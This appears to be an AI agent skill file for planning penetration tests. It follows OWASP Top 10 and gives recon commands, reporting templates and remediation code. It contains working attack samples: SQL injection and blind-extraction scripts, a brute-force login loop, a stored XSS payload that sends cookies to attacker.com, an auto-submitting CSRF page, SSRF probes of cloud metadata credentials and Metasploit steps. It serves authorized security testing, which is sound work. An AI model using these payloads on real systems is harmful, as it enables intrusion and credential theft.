---
name: penetration-testing
description: Design penetration testing plans with OWASP methodology, attack vectors, and remediation tracking. Outputs test scope, findings, and security improvements.
argument-hint: [application type, attack surface, compliance requirements]
allowed-tools: Read, Write, Bash
---

# Penetration Testing

Design systematic penetration tests to identify vulnerabilities. Not random hacking — structured OWASP methodology, documented findings, and remediation roadmaps.

## Process

1. **Define scope.** Systems in scope, out of scope, testing window.
2. **Reconnaissance.** Gather info (subdomains, tech stack, exposed services).
3. **Vulnerability scanning.** Automated tools (Nessus, Burp Suite).
4. **Manual exploitation.** OWASP Top 10, business logic flaws.
5. **Privilege escalation.** Lateral movement, admin access.
6. **Document findings.** Severity (Critical, High, Medium, Low), reproduction steps.
7. **Recommend fixes.** Specific remediation for each vulnerability.

## Output Format

### Penetration Test: [Application Name]

**Scope:** Web app + API + Infrastructure  
**Methodology:** OWASP Testing Guide  
**Findings:** 23 (3 critical, 8 high, 9 medium, 3 low)  
**Critical Issues:** SQL injection, broken authentication, sensitive data exposure  
**Remediation:** All critical fixed within 7 days

---

## Testing Phases

### 1. Reconnaissance (Information Gathering)

```bash
# Subdomain enumeration
subfinder -d example.com -o subdomains.txt

# DNS enumeration
dig example.com ANY
nslookup -type=any example.com

# Technology detection
whatweb https://example.com
wappalyzer https://example.com

# Port scanning
nmap -sV -sC -p- example.com
# -sV: version detection
# -sC: default scripts
# -p-: all ports

# WHOIS lookup
whois example.com

# Google dorking
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com ext:sql
```

### 2. Vulnerability Scanning

```bash
# Web vulnerability scanner
nikto -h https://example.com

# SSL/TLS testing
sslscan example.com
testssl.sh example.com

# Directory bruteforce
gobuster dir -u https://example.com -w /usr/share/wordlists/common.txt

# SQLMap (SQL injection scanner)
sqlmap -u "https://example.com/product?id=1" --batch --risk=3

# OWASP ZAP (automated + manual)
zap-cli start
zap-cli spider https://example.com
zap-cli active-scan https://example.com
```

---

## OWASP Top 10 Testing

### A01: Broken Access Control

```http
# Test: IDOR (Insecure Direct Object Reference)
GET /api/users/123 HTTP/1.1
Authorization: Bearer user456_token

# Try accessing other user's data
GET /api/users/456 HTTP/1.1
Authorization: Bearer user456_token

# Expected: 403 Forbidden
# Vulnerable: 200 OK with user 456 data
```

**Test cases:**
- Change user ID in URL/API
- Access admin endpoints as regular user
- Modify JWT claims (role: user → admin)

### A02: Cryptographic Failures

```bash
# Check for sensitive data in transit (no HTTPS)
curl -I http://example.com/login

# Check for weak encryption
sslscan example.com | grep "Accepted"

# Check for exposed secrets
grep -r "password" .env
git log --all | grep -i password
```

**Test cases:**
- Sensitive data over HTTP
- Weak SSL/TLS ciphers
- Hardcoded secrets in source code
- Unencrypted database backups

### A03: Injection

```sql
-- SQL Injection test
-- Input: admin' OR '1'='1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'

-- Union-based SQLi
' UNION SELECT NULL, username, password FROM users--

-- Time-based blind SQLi
' OR IF(1=1, SLEEP(5), 0)--
```

```javascript
// Command injection
// Input: ; ls -la
const exec = require('child_process').exec;
exec(`ping ${userInput}`);  // VULNERABLE
```

**Test cases:**
- SQL injection in login forms
- Command injection in file uploads
- XPath injection in XML queries
- LDAP injection in authentication

### A04: Insecure Design

**Business logic flaws:**
```
Test case: Apply same promo code multiple times
1. Add product to cart ($100)
2. Apply PROMO20 (-$20)
3. Add product again
4. Apply PROMO20 again (-$20)
Result: $60 total instead of $160
```

**Race conditions:**
```python
# Test concurrent withdrawals
import threading

def withdraw(amount):
    balance = get_balance()  # Read balance
    time.sleep(0.1)  # Simulate processing
    set_balance(balance - amount)  # Write new balance

# Two simultaneous withdrawals
t1 = threading.Thread(target=withdraw, args=(100,))
t2 = threading.Thread(target=withdraw, args=(100,))
t1.start()
t2.start()
# Vulnerable: Both read balance = 200, both withdraw 100, final balance = 100 (should be 0)
```

### A05: Security Misconfiguration

```bash
# Check for default credentials
curl -u admin:admin https://example.com/admin

# Check for directory listing
curl https://example.com/.git/
curl https://example.com/backup/

# Check for error disclosure
curl https://example.com/nonexistent

# Check security headers
curl -I https://example.com | grep -i "x-frame-options\|x-content-type\|strict-transport"
```

**Test cases:**
- Default credentials still work
- Directory listing enabled
- Verbose error messages (stack traces)
- Missing security headers

### A06: Vulnerable Components

```bash
# Check dependencies for vulnerabilities
npm audit
pip-audit

# Check for outdated software
nmap -sV example.com

# Check CVE database
searchsploit apache 2.4.29
```

### A07: Authentication Failures

```python
# Brute force test
import requests

passwords = ['password', '123456', 'admin', ...]

for pwd in passwords:
    r = requests.post('https://example.com/login', data={
        'username': 'admin',
        'password': pwd
    })
    
    if 'Invalid credentials' not in r.text:
        print(f"Password found: {pwd}")
        break
```

**Test cases:**
- No rate limiting on login
- Weak password policy
- Session fixation vulnerability
- Predictable session tokens

### A08: Software & Data Integrity Failures

```bash
# Check for unsigned packages
npm install --dry-run | grep "integrity"

# Check for HTTPS in package sources
cat package-lock.json | grep "http://"

# Test file upload integrity
# Upload: malicious.pdf.php
# Server should validate MIME type AND extension
```

### A09: Logging & Monitoring Failures

**Test cases:**
- Failed login attempts not logged
- Admin actions not audited
- No alerts on suspicious activity
- Log injection possible

```
# Log injection test
# Username: admin\n[2024-03-21] CRITICAL: System compromised
# Pollutes logs with fake entries
```

### A10: Server-Side Request Forgery (SSRF)

```http
# Test SSRF via URL parameter
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

```python
# SSRF test
import requests

# Try to access internal services
urls = [
    'http://localhost:6379',  # Redis
    'http://localhost:3306',  # MySQL
    'http://169.254.169.254/latest/meta-data/',  # AWS metadata
]

for url in urls:
    r = requests.get(f'https://example.com/fetch?url={url}')
    if r.status_code == 200:
        print(f"SSRF vulnerable to: {url}")
```

---

## Exploitation Examples

### SQL Injection Exploitation

```python
import requests

# Test for SQL injection
url = "https://example.com/product"

# Boolean-based blind SQLi
payloads = [
    "1' AND 1=1--",  # Should return normal
    "1' AND 1=2--",  # Should return different
]

for payload in payloads:
    r = requests.get(url, params={'id': payload})
    print(f"Payload: {payload}, Length: {len(r.text)}")

# If lengths differ, vulnerable to boolean-based SQLi

# Extract database name
# ' AND SUBSTRING(database(),1,1)='a'--
for char in 'abcdefghijklmnopqrstuvwxyz':
    payload = f"1' AND SUBSTRING(database(),1,1)='{char}'--"
    r = requests.get(url, params={'id': payload})
    if 'Product found' in r.text:
        print(f"First char of database: {char}")
        break
```

### XSS (Cross-Site Scripting)

```html
<!-- Reflected XSS -->
<script>alert(document.cookie)</script>

<!-- Stored XSS -->
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">

<!-- DOM-based XSS -->
<iframe src="javascript:alert('XSS')">

<!-- Bypass filters -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<svg/onload=alert(1)>
```

### CSRF (Cross-Site Request Forgery)

```html
<!-- Malicious page attacker sends to victim -->
<html>
<body>
  <form action="https://example.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

---

## Tools

### Burp Suite
```
Proxy → Intercept requests
Repeater → Modify and resend requests
Intruder → Automated attacks (brute force)
Scanner → Automated vulnerability detection
```

### Metasploit
```bash
# Start Metasploit
msfconsole

# Search for exploit
search apache

# Use exploit
use exploit/unix/webapp/apache_struts_code_exec

# Set target
set RHOST 192.168.1.100

# Run exploit
exploit
```

---

## Reporting

### Vulnerability Report Template

```markdown
## Vulnerability: SQL Injection in Product Search

**Severity:** Critical (CVSS 9.8)

**Affected Component:** /api/products/search endpoint

**Description:**
The product search endpoint is vulnerable to SQL injection. An attacker can inject arbitrary SQL commands through the 'query' parameter.

**Reproduction Steps:**
1. Navigate to https://example.com/products
2. Enter search term: `' OR '1'='1`
3. Observe that all products are returned, bypassing search logic
4. Payload `' UNION SELECT username, password FROM users--` reveals user credentials

**Proof of Concept:**
```http
GET /api/products/search?query=' UNION SELECT username, password FROM users-- HTTP/1.1
Host: example.com

Response:
[
  {"username": "admin", "password": "hash123"},
  {"username": "user", "password": "hash456"}
]
```

**Impact:**
- Full database access (confidentiality breach)
- Data modification/deletion possible
- Potential for remote code execution

**Recommendation:**
1. Use parameterized queries (prepared statements)
2. Input validation with allowlist
3. Principle of least privilege for database user
4. Web Application Firewall (WAF)

**Remediation Code:**
```python
# Before (VULNERABLE)
query = f"SELECT * FROM products WHERE name LIKE '%{user_input}%'"

# After (SECURE)
query = "SELECT * FROM products WHERE name LIKE %s"
cursor.execute(query, (f'%{user_input}%',))
```

**Status:** Open  
**Assigned To:** Backend Team  
**Due Date:** 2024-03-28
```

---

## Severity Scoring (CVSS)

```
Critical (9.0-10.0): Remote code execution, authentication bypass
High (7.0-8.9): SQL injection, XSS with data access
Medium (4.0-6.9): CSRF, information disclosure
Low (0.1-3.9): Security misconfiguration, verbose errors
```

**CVSS Calculator:**
```
Base Score:
- Attack Vector (Network, Adjacent, Local, Physical)
- Attack Complexity (Low, High)
- Privileges Required (None, Low, High)
- User Interaction (None, Required)
- Impact (Confidentiality, Integrity, Availability)
```

---

## Remediation Tracking

```markdown
| Finding | Severity | Status | Owner | Due Date | Fixed Date |
|---------|----------|--------|-------|----------|------------|
| SQL Injection | Critical | Fixed | Backend | 2024-03-28 | 2024-03-25 |
| XSS in comments | High | In Progress | Frontend | 2024-04-05 | - |
| Missing CSRF tokens | Medium | Open | Backend | 2024-04-15 | - |
```

---

## Continuous Testing

```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run dependency check
        run: npm audit --audit-level=high
      
      - name: SAST with Semgrep
        run: semgrep --config=auto .
      
      - name: DAST with OWASP ZAP
        run: |
          docker run -t owasp/zap2docker-stable zap-baseline.py \
            -t https://staging.example.com \
            -r report.html
```

## Rules

- Scope defined before testing — avoid accidentally attacking production or out-of-scope systems.
- Written authorization required — penetration testing without permission is illegal.
- Test in isolated environment first — staging or dedicated test environment.
- Document everything — reproduction steps, payloads, screenshots for every finding.
- Severity based on impact + exploitability — remote code execution with no auth = critical.
- Critical findings fixed within 7 days — high within 30 days, medium within 90 days.
- Retest after fixes — verify vulnerability actually patched, not just marked as fixed.
- OWASP Top 10 tested on every application — covers 80% of common vulnerabilities.
- Automated scans weekly — manual testing quarterly or after major changes.
- Penetration test results never shared publicly — sensitive information about vulnerabilities.
